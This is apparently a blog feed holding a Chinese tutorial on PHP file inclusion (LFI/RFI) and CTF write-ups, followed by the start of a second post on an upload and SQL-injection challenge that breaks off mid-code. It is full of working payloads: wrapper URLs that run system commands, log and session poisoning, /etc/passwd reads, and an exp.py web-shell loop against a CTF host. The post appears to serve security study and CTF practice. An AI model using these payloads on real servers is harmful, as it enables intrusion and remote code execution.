    <content type="html"><![CDATA[<center><h2> `"所谓博客，只不过是孤芳自赏罢了"`</h2></center><span id="more"></span><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>php中引发文件包含漏洞的通常是以下四个函数：</p><ul><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ul><p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><img src="/image/php_file_include/1.png" alt="require"></p><p>include() 如果出错的话，只会提出警告，会继续执行后续语句。</p><p><img src="/image/php_file_include/2.png" alt="include"></p><p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt</span><br></pre></td></tr></table></figure><p>即可成功解析phpinfo。</p><p><img src="/image/php_file_include/3.png" alt="phpinfo"></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul><li>具有相关的文件包含函数。</li><li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li><li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>LFI (Local File Inclusion)</li></ul><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p><ul><li>RFI (Remote File Inclusion)</li></ul><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p><ol><li> <code>allow_url_fopen = On</code></li><li> <code>allow_url_include = On</code></li></ol><p>两个配置选项均需要为On，才能远程包含文件成功。</p><p><img src="/image/php_file_include/4.png" alt="RFI"></p><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>allow_url_fopen 默认为 On</li><li>allow_url_include 默认为 Off</li></ul><p>若有特殊要求，会在利用条件里指出。</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen不做要求。</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p>姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/php_file_include/5.png" alt="php://"></p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：默认均可</p><p>姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php？file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>通过指定末尾的文件，可以读取经base64加密后的文件源码.</p><p>其他姿势：</p><p><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php版本大于等于php5.3.0</span><br></pre></td></tr></table></figure><p>姿势：</p><p>假设有个文件<code>phpinfo.txt</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：</p><p><img src="/image/php_file_include/9.png" alt="phar://"></p><p>指定绝对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar:///var/www/test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/image/php_file_include/7.png" alt="7.png"></p><p>或者使用相对路径（这里test.zip就在上一层目录下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://../test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/image/php_file_include/6.png" alt="6.png"></p><h1 id="RCTF-2018-Backdoor"><a href="#RCTF-2018-Backdoor" class="headerlink" title="RCTF 2018 Backdoor"></a>RCTF 2018 Backdoor</h1><ul><li><a href="https://xz.aliyun.com/t/2347">RCTF 2018 Writeup — De1ta</a></li></ul><p>一道题考到了<code>php://filter</code> , <code>phar://</code></p><p><a href="http://backdoor.2018.teamrois.cn/">http://backdoor.2018.teamrois.cn/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post</span><br></pre></td></tr></table></figure><h2 id="post-php"><a href="#post-php" class="headerlink" title="post.php"></a>post.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读upload.php源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure><h2 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> !== <span class="variable">$zip</span>-&gt;open(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;No a valid zip&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$zip</span>-&gt;getFromName(<span class="string">&#x27;tmp/random.txt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;No file&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dest</span> = <span class="string">&#x27;uploads/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . hash(<span class="string">&#x27;sha256&#x27;</span>, file_get_contents(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) . <span class="string">&#x27;.zip&#x27;</span>;</span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$dest</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Saved into &#x27;</span> . <span class="variable">$dest</span>;</span><br></pre></td></tr></table></figure><p>post.php存在限制后缀的文件包含，可以通过phar://或者zip://协议绕过，从而包含恶意代码getshell，upload.php中限制了上传的文件要是个zip并且里面要有个random.txt文件。</p><p>我们在压缩包中再加入一个 evil.php 文件，当通过post.php 访问 action=phar://dest/evil 时，即访问 phar://dest/evil.php 注意 post.php 中的代码include $_GET[‘action’] . ‘.php’</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a>exp.py:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;Saved into &quot;</span></span><br><span class="line">post_url = <span class="string">&quot;http://backdoor.2018.teamrois.cn/post.php?action=upload&quot;</span></span><br><span class="line">zip_file = <span class="built_in">open</span>(<span class="string">&quot;tmp.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">upload_file = &#123;<span class="string">&#x27;file&#x27;</span>:zip_file&#125;</span><br><span class="line">r = requests.post(post_url,files=upload_file)</span><br><span class="line">dest = r.text[<span class="built_in">len</span>(s):]</span><br><span class="line">shell_url = <span class="string">&quot;http://backdoor.2018.teamrois.cn/post.php?action=phar://&quot;</span>+ dest + <span class="string">&quot;/evil&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] shell url: &quot;</span> + shell_url)</span><br><span class="line"><span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;command: &quot;</span>)</span><br><span class="line">    payload = &#123;<span class="string">&#x27;chybeta&#x27;</span>: <span class="string">&#x27;system(&quot;%s&quot;);&#x27;</span> % command&#125;</span><br><span class="line">    r = requests.get(shell_url,params=payload)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p><p>php版本大于等于php5.3.0<br>姿势：<br>构造zip包的方法同phar。</p><p>但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure><p>data:URI schema<br>利用条件：</p><p>php版本大于等于php5.2<br>allow_url_fopen = On<br>allow_url_include = On<br>姿势一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/image/php_file_include/8.png" alt="data:text/plain,&lt;?php phpinfo();?&gt;"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/php_file_include/10.png" alt="system()"></p><p>姿势二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p>加号+的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure><p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>姿势：</p><p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p><p>常见的php-session存放位置：</p><ul><li>/var/lib/php/sessions</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ul><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><img src="/image/php_file_include/16.png" alt="16.png"></p><p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p><p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce">透過LFI引入PHP session檔案觸發RCE</a></p><p>總結一下此次經驗</p><p>當遇到 LFI 漏洞時，可以先檢查一下幾種可能的檔案：</p><ul><li>/etc/passwd</li><li>/proc/self/environ</li><li>All possible config files ( e.g. Apache /etc/httpd/conf/httpd.conf )</li><li>Web server access, error log ( e.g. /etc/httpd/logs/access_log )</li><li>Session files ( e.g. /tmp/sess_{SESSION_ID} )</li><li>PHP 使用 $_GET[1]、$_POST[1] 可以避開引號跳脫的問題(前面提到事後得知$_GET[b]即可正常執行)。<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2></li></ul><p>访问日志</p><p>常见几个路径：</p><ul><li>/var/log/apache/access_log</li><li>/var/www/logs/access_log</li><li>/var/log/access_log</li></ul><p>查看 log </p><p><code>/etc/apache2/sites-enabled/000-default.conf</code></p><p><img src="/image/php_file_include/11.png" alt="000-default.conf"></p><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p><p>姿势：</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入<code>access.log</code>，当发生错误时将错误写入<code>error.log</code>。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p><p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><img src="/image/php_file_include/12.png" alt="12.png"></p><p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p><p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup</a></p><p>以及<a href="http://cr4ckm3.top/2018/05/01/2018%E7%BA%A2%E5%B8%BD%E6%9D%AF/">2018红帽杯</a></p><h2 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h2><p>利用条件：</p><p>需要知道ssh-log的位置，且可读。</p><p>默认情况下为 <code>/var/log/auth.log</code></p><p>姿势：</p><p>用ssh连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ ssh &#x27;&lt;?php phpinfo(); ?&gt;&#x27;@remotehost</span><br></pre></td></tr></table></figure><p>之后会提示输入密码等等，随便输入。</p><p>之后进行文件包含即可。</p><p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">RCE with LFI and SSH Log Poisoning</a></p><h2 id="包含environ-系统环境"><a href="#包含environ-系统环境" class="headerlink" title="包含environ 系统环境"></a>包含environ 系统环境</h2><p>利用条件：</p><p>php以cgi方式运行，这样environ才会保持UA头。<br>environ文件存储位置已知，且environ文件可读。<br>姿势：</p><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>可以参考这个：</p><p><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html">The proc/self/environ Injection</a></p><p><a href="https://www.exploit-db.com/papers/12886/">shell via LFI - proc/self/environ method</a></p><h1 id="本地包含小姿势"><a href="#本地包含小姿势" class="headerlink" title="本地包含小姿势"></a>本地包含小姿势</h1><p>审计中可见这样的包含模版文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;inc/&quot; . $_GET[&#x27;file&#x27;] . &quot;.htm&quot;); ?&gt; </span><br></pre></td></tr></table></figure><ul><li>%00截断<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd%00</span><br></pre></td></tr></table></figure>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li></ul><ul><li><p>%00截断目录遍历：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/%00</span><br></pre></td></tr></table></figure><p>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p></li><li><p>路径长度截断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd/././././././.[…]/./././././.</span><br></pre></td></tr></table></figure><p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p></li><li><p>点号截断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/boot.ini/………[…]…………</span><br></pre></td></tr></table></figure><p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p></li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html">From LFI to RCE in php</a><br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html">l3m0n: 文件包含漏洞小结</a><br><a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a><br><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion">Local File Inclusion</a></p><p><a href="http://wiki.wooyun.org/web:lfi">http://wiki.wooyun.org/web:lfi</a></p><p>PHP文件包含漏洞总结：<br><a href="http://drops.wooyun.org/tips/3827">http://drops.wooyun.org/tips/3827</a></p><p>文件包含与注入利用总结：<br><a href="https://www.91ri.org/2736.html">https://www.91ri.org/2736.html</a></p><p>php://input，php://filter，data URI schema的那些事：<br><a href="https://www.91ri.org/7470.html">https://www.91ri.org/7470.html</a></p><p>phar协议：<br><a href="https://www.91ri.org/13363.html">https://www.91ri.org/13363.html</a></p><p>论PHP常见的漏洞：<br><a href="http://drops.wooyun.org/papers/4544">http://drops.wooyun.org/papers/4544</a></p><p>LFI WITH PHPINFO() ASSISTANCE：<br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p><p>PHP_LFI_rfc1867_temporary_files：<br><a href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf</a></p><p>zip或phar协议包含文件<br><a href="http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html">http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html</a></p><h1 id="工具-amp-amp-防御"><a href="#工具-amp-amp-防御" class="headerlink" title="工具&amp;&amp;防御"></a>工具&amp;&amp;防御</h1><p>工具：</p><p><a href="https://github.com/P0cL4bs/Kadimus/">https://github.com/P0cL4bs/Kadimus/</a></p><p>防御：</p><ul><li>设置open_basedir</li></ul>]]></content>
    
    
    <summary type="html">&lt;center&gt;&lt;h2&gt; `&quot;所谓博客，只不过是孤芳自赏罢了&quot;`&lt;/h2&gt;&lt;/center&gt;</summary>
    
    
    
    
    <category term="php文件包含" scheme="https://cr4ckm3.top/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>强网杯国际精英邀请赛Web知识点</title>
    <link href="https://cr4ckm3.top/2018/05/20/qiangwangbei/"/>
    <id>https://cr4ckm3.top/2018/05/20/qiangwangbei/</id>
    <published>2018-05-19T16:00:00.000Z</published>
    <updated>2019-08-30T10:00:43.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="py到出题人的说明："><a href="#py到出题人的说明：" class="headerlink" title="py到出题人的说明："></a>py到出题人的说明：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">随意输入用户名进入，用户名使用addslashes过滤，取xff等变量为ip显示</span><br><span class="line"></span><br><span class="line">上传文件黑名单过滤了常见php后缀，大小写不敏感，可以在后缀后加空格绕过检测</span><br><span class="line"></span><br><span class="line">使用fileinfo检测MIME必须为php文件，text/x-php，文件内容检测开头不能使用&lt;?，可以使用bom头绕过内容检测</span><br><span class="line"></span><br><span class="line">随机生成64位长度的文件名，上传成功后在主页显示当前用户上传的文件名，但只显示前10个字符</span><br><span class="line"></span><br><span class="line">文件上传成功时会将用户名，IP和文件名入库，如果用户名长度超过20位则截取前20个字符，所以可以构造一个用户名，前十九位随意填写，第二十位填写单引号等会被addslashes转义的符号，入库时因为有截取操作所以可以使用遗留下来的反斜线吃掉单引号造成注入，IP处可以进行注入，过滤了空格和一些函数，可以使用mid函数进行字符串截取操作</span><br><span class="line"></span><br><span class="line">随意使用一个用户名绕过上传过滤得到一个webshell，构造特殊用户名上传文件通过insert注入获取之前上传得webshell真实文件名，上传目录为常见的uploads文件夹，很容易就能被扫到</span><br><span class="line"></span><br><span class="line">使用构造后的用户名「xxx&#x27;,」注意有因为注入遗留下来得单引号和逗号 ，登入后可以看到很多个被截断后的文件名，拼接起来就是文件名</span><br></pre></td></tr></table></figure><h1 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> [<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$file</span> [<span class="string">&#x27;error&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                <span class="variable">$mes</span> = <span class="string">&#x27;The uploaded file exceeds the value of the upload_max_filesize option in the PHP configuration file&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                <span class="variable">$mes</span> = <span class="string">&#x27;Exceeded the size of the form MAX_FILE_SIZE limit&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">                <span class="variable">$mes</span> = <span class="string">&#x27;File section was uploaded&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line">                <span class="variable">$mes</span> = <span class="string">&#x27;No upload file selected&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span> :</span><br><span class="line">                <span class="variable">$mes</span> = <span class="string">&#x27;No temporary directory found&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span> :</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span> :</span><br><span class="line">                <span class="variable">$mes</span> = <span class="string">&#x27;System error&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$mes</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    checkMIME(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (checkContent(<span class="variable">$content</span>) &amp;&amp; checkExts(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">        upload(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;attack detected&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file not found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$savepath</span> = dirname(<span class="keyword">__file__</span>) . <span class="string">&#x27;/uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$newname</span> = rand_name() . <span class="string">&quot;.&quot;</span> . trim(end(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="variable">$finalname</span> = <span class="variable">$savepath</span> . <span class="variable">$newname</span>;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$finalname</span>)) &#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> Database();</span><br><span class="line">        <span class="comment">//,1,(select 